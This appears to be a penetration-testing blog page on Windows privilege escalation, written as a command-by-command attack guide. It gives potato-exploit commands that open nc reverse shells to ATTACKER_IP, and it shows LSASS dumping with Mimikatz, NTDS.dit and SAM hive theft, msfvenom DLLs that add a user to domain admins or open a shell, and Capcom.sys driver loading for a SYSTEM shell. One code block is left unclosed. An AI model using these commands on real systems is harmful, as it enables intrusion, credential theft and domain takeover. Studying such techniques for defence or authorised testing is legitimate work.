# Windows Privilege Escalation

As with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain ```Administrator``` or ```NT AUTHORITY\SYSTEM``` rights. While the ```Administrator``` is a user on any Windows machine, ```NT AUTHORITY\SYSTEM```, often called ```SYSTEM```, is an account that has the most rights but to which you cannot log in with credentials.

> For reading purpose, I won't tell if we are using a ```CMD``` console when running a command but will display a command that uses ```Powershell``` like ```PS> COMMAND```.
{: .prompt-danger }

## Network Information Gathering

### IPconfig

As for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command ```ipconfig``` :
```cmd
ipconfig /all
```
This will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.

### ARP

We can use the ```arp``` command to check for other computers on the network like this :

```cmd
arp -a
```

### Routing Table

The routing table can show us what routes can packages take on the network :

```cmd
route print
```

### Netstat

The ```netstat``` command can show us if there is any service running on the machine that may be leveraged :

```cmd
netstat -ano
```

### Windows Defender & AppLocker Rules

To display information about ```Windows Defender``` or the ```AppLocker``` rules we can run the followinf commands :
```powershell
PS > Get-MpComputerStatus
```
```powershell
PS > Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

-------

## Basic Enumeration

It's important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the ```tasklist``` command :

```cmd
tasklist /svc
```

### System information

We can list environment variables with the ```set``` command. With the ```systeminfo``` we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used...

To see if a machine is up to date, we can look to its ```hotfixes``` with the following command and by checking the Microsoft website:
```cmd
wmic qfe
```
or
```powershell
PS > Get-HotFix | ft -AutoSize
```

#### Program installed

We can check for non-standard applications that may have been installed by a user or an administrator :

```cmd
wmic product get name
```
or
```powershell
PS > Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### RPC

A user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the ```query user``` command. If you want to know how to impersonate this user check [this part of my blog](https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&_Attacks#rdp-session-hijacking).

### Current User Privileges

When we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the ```whoami``` or the ```echo %USERNAME%``` command. To see which rights our user has we can run the command ```whoami /priv``` and if we are a classic user we may get this output.

```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> As you can see, we have some privileges that are disabled. You can enable them all using [this script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) or [this one](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1). First enable the script ```Import-Module .\EnableAllTokenPrivs.ps1``` and then run it ```.\EnableAllTokenPrivs.ps1```.
{: .prompt-tip }

We may want to check which group we are in because we can inherit privileges from certain.

```cmd
whoami /groups
```

We may also want to look for other users with the ```net user``` command or the list of all groups with this ```net localgroup``` command. To get information about a certain group you can use ```net localgroup GROUP_TO_CHECK```.

-------

## Exploit User Rights

### SeImpersonate & SeAssignPrimaryToken

Every process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The ```SeImpersonate``` privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.

We are going to use [JuicyPotato](https://github.com/ohpe/juicy-potato) that can be used to exploit the ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :

```cmd
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd" -t *
```

> You may get issues if you don't put the full path of a file.
{: .prompt-tip }

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

> If you are not running the exploit from a running process like an SQL server. You may need to add the ```-c``` flag. The add a value, depending on the machine you are on, from [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md). If the first value doesn't work try the second, then the third... until it works.
{: .prompt-warning }

Where [JuicyPotato](https://github.com/ohpe/juicy-potato) doen't work ```Windows Server 2019``` and ```Windows 10 build 1809``` onwards, [RoguePotato](https://github.com/antonioCoco/RoguePotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) do work.

```cmd
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"
```

or

```cmd
c:\tools\RoguePotato.exe -r ATTACKER_IP -e "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd" -l LISTENING_PORT
```

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

### SeDebugPrivilege

Instead of adding the account to the administrators group, a user may be given the ```SeDebugPrivilege``` to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The ```Local Security Authority Subsystem Service``` (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the ```Task Manager```, go to the ```Details``` section and find the ```lsass.exe``` process. When found, you can right click on it and select ```Create dump file```. The command for the command line is :

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Now that we have the lsass dump (```lsass.dmp```), we can run [Mimikatz](https://www.kali.org/tools/mimikatz/) (you can also use the [github repo](https://github.com/ParrotSec/mimikatz)).

```cmd
mimikatz.exe
```

When on Mimikatz, we will try to dump password hashes :

```cmd
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords

<SNIP>
```


### SeTakeOwnershipPrivilege


The ```SeTakeOwnershipPrivilege``` policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.

First we can check who has the ownership of the file we are targeting :

```powershell
PS > Get-ChildItem -Path 'C:\Users\bob\Desktop\Secret_Data.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

If there is no name on the ```Owner``` section, you can look a the owner of the directory where the file is located with the ```dir /q``` command. Now we can take the ownership :

```powershell
PS > takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

If we still can't read the file, we can use the ```icacls``` command to change its Access Control Lists (ACL) :

```cmd
icacls 'C:\Users\bob\Desktop\Secret_Data.txt' /grant OUR_USER:F
```

This command will grant us full access (```F```) to the file.

---

## Exploit Groups Permissions

Just like the user privileges, groups allow you to do things that a normal user may not be able to do. To see in which group we are in you can use the command ```whoami /groups```.

### Backup Operators

When member of this group, we are granted the ```SeBackup``` and ```SeRestore``` rights. ```SeBackupPrivilege``` allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with ```SeBackupPrivilege``` enabled obviates the need for any ACL-based security check.

Because we can't use the standard ```copy``` command, we can use a program to copy files or just use the following [PoC](https://github.com/giuliano108/SeBackupPrivilege). As the Github states, we need to import the two ```dll``` in ```Powershell``` :

```powershell
PS > Import-Module .\SeBackupPrivilegeUtils.dll
PS > Import-Module .\SeBackupPrivilegeCmdLets.dll
```
To check if the ```SeBackupPrivilege``` is enabled, we can use either the ```woami /priv``` or the ```PS > Get-SeBackupPrivilege``` command. If the privilege isn't enabled, we can use the following command to enable it :

```powershell
PS > Set-SeBackupPrivilege
```

Imagine that we can't read the content of the ```Secret_Data.txt``` on the bob desktop. We can use this command to copy it to a location where we have read rights.

```powershell
PS > Copy-FileSeBackupPrivilege 'C:\Users\bob\Desktop\Secret_Data.txt' .\Secret_Data.txt
```

#### Attacking Domain Controler (NTDS.dit)

This group also permits local domain controller logins. Given that it stores the NTLM hashes for all user and computer objects in the domain, the active directory database ```NTDS.dit``` makes for an extremely appealing target. However, unprivileged users cannot access this file since it is locked.

The [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) command allows us to create a shadow copy of the ```C:``` drive.

```powershell
PS > diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Now if you try to list the directories of the ```E:``` drive, you will see the same tree structure as in the ```C:``` drive.
The ```Copy-FileSeBackupPrivilege``` cmdlet allows us to bypass ACL and copy the NTDS.dit wherever we want :

```powershell
PS > Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\Public\Downloads\ntds.dit
```

> You also use tools to extract the ```ntds.dit``` file like robocopy :  ```robocopy /B E:\Windows\NTDS .\ntds ntds.dit```
{: .prompt-tip }

We can now export ```SAM``` and ```SYSTEM``` registery hives and try to crack local user passwords. First we need to export these hives :

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
```
```cmd
reg save HKLM\SAM SAM.SAV
```
Now that we have the ```SAM``` and ```SYSTEM``` registery hives, we can extract all AD account credentials using tools such as ```secretsdump.py``` or the PowerShell [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1) :

1. **DSInternals**

```powershell
PS > Import-Module .\DSInternals.psd1
PS > $key = Get-BootKey -SystemHivePath .\SYSTEM
PS > Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
<CREDS>
```

2. **Secretsdump**

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

{: .prompt-info }

{: .prompt-tip }

### Event Log Readers

Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. You can try finding commands ran with credentials using either the CMD or Powershell :

```cmd
wevtutil qe Security /rd:true /f:text | findstr "/user"
```

```powershell
PS > wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

or 

```powershell
PS > Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DnsAdmins

Members of ```DnsAdmins``` group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group exists only if the DNS server role is or was once installed on a domain controller in the domain. Membership in this group may be used to increase privileges on a Domain Controller or in cases where a different server is serving as the domain's DNS server because the DNS service is run as ```NT AUTHORITY\SYSTEM```.

#### Leveraging DnsAdmins Access

First we will create a malicious dll file to add your user to the ```domain admins``` or to create a reverse shell on our attacker Linux machine :

```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" USER /add /domain' -f dll -o adduser.dll
```

or

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o shell-cmd.dll
```

Now that our ```.dll``` malicious file is created you can upload it to the Windows machines using the method of your choice (HTTP, SMB, FTP server...).
If you start a HTTP server you can download the file on windows using the following command :

```cmd
wget "http://IP:PORT/YOUR_MALICIOUS_FILE.dll" -outfile "YOUR_MALICIOUS_FILE.dll"
```

If you are not a member of the ```DnsAdmins``` group you may get an error when trying to execute your malicious dll.

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\Public\Downloads\YOUR_MALICIOUS_FILE.dll
```

> You can check if you are a member of the ```DnsAdmins``` group with the command : ```Get-ADGroupMember -Identity DnsAdmins```.
{: .prompt-tip }

> We must specify the full path to our malicious DLL or the attack will not work properly.
{: .prompt-warning }

To receive our reverse shell or to add our user to a certain group we need to stop the DNS service and start it back :

```cmd
sc stop dns
```
```cmd
sc start dns
```

You can also use the ```mimilib.dll``` (by the creator of Mimikatz) explained in [this blog](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) to abuse the ```dns admin group``` privileges.

### Creating a WPAD Record

Clients can utilize the Web Proxy Auto-Discovery (WPAD) Protocol to find the URL of a configuration file using DHCP and/or DNS discovery techniques. The configuration file can be invoked to find the proxy for a given URL after detection and download are finished.

For this attack to work, we first need to disable the Global Query Block List :

```powershell
PS > Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.DOMAIN_NAME.local
```

We can now add our attacker machine to the WPAD Records :

```powershell
PS > Add-DnsServerResourceRecordA -Name wpad -ZoneName DOMAIN.local -ComputerName dc01.DOMAIN.local -IPv4Address OUR_ATTACKER_IP
```

### Print Operators

Members of this group can manage, create, share, and delete printers that are connected to domain controllers in the domain. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. This grant their user the ```SeLoadDriverPrivilege``` privilege.

First we can use the [EnableSeLoadDriverPrivilege](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to enable the privilege and load the driver. You can add the following includes at the begining of the file :

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

You can compile the ```.cpp``` file in Visual Studio using the following command : ```cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp```.
Now you have to upload this [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) file and add a reference to this driver under our HKEY_CURRENT_USER tree :

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\Public\Downloads\Capcom.sys"
```
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

We can use the [DriverView.exe](https://www.nirsoft.net/utils/driverview.html) tool to see if the ```Capcom.sys``` driver is loaded or not.

```powershell
PS > .\DriverView.exe /stext drivers.txt
```
```powershell
PS > cat drivers.txt | Select-String -pattern Capcom
```

If the second command doesn't give you any output, it means that the driver is not loaded. You can run the program that you have compiled earlier :

```cmd
EnableSeLoadDriverPrivilege.exe
```

If you run the previous commands, you will now see that the ```Capcom.sys``` driver is now loaded.
You can now use [this PoC](https://github.com/tandasat/ExploitCapcom) to exploit the ```Capcom.sys```.
 
> If you don't have a GUI connection to the windows machine, you may not be able to execute the previous exploit. You can modify it by replacing the call of the ```cmd.exe``` in the ```LaunchShell``` by a call to a reverse shell executable that you created before compiling ```ExploitCapcom.cpp```. The line should look like ```TCHAR CommandLine[] = TEXT("C:\\ProgramData\\MyReverseShell.exe");```.
{: .prompt-danger }

You can automate all this process with [this exploit](https://github.com/TarlogicSecurity/EoPLoadDriver/) and then run the ```ExploitCapcom.exe``` to pop us a ```SYSTEM``` shell :

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\Public\Downloads\Capcom.sys
```
